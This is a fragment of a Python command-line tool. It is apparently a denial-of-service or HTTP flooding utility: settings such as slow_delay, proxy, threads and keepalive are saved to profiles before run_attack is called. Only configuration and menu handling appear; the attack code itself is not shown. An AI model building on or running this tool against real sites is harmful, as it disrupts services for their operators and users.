            format="%(asctime)s %(message)s",
        )

    if args.profile:
        prof = load_profile(args.profile)
        if prof is None:
            Log.err(t("menu_noprofile", n=args.profile))
            return 1
        for k, v in prof.items():
            if hasattr(args, k):
                setattr(args, k, v)
        if prof.get("lang"):
            select_language(prof["lang"])

    if args.save_profile:
        snapshot = {
            "url": args.url or "",
            "mode": args.mode,
            "method": args.method,
            "technique": args.technique,
            "slow_delay": args.slow_delay,
            "with_data": args.with_data,
            "proxy_ver": args.proxy_ver,
            "threads": args.threads,
            "period": args.period,
            "pipeline": args.pipeline,
            "keepalive": args.keepalive,
            "out_file": args.out_file,
            "cookies": args.cookies,
            "data": args.data or "",
            "brute": args.brute == "1",
            "down": args.down,
            "check": args.check,
            "check_to": args.check_to,
            "check_w": args.check_w,
            "log_file": args.log_file,
            "lang": args.lang or LANG,
        }
        save_profile(args.save_profile, snapshot)
        Log.ok(t("menu_saved", n=args.save_profile))
        return 0

    if args.menu:
        return interactive_menu(args)

    return run_attack(args)


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print()
        Log.warn(t("warn_interrupt"))
        sys.exit(130)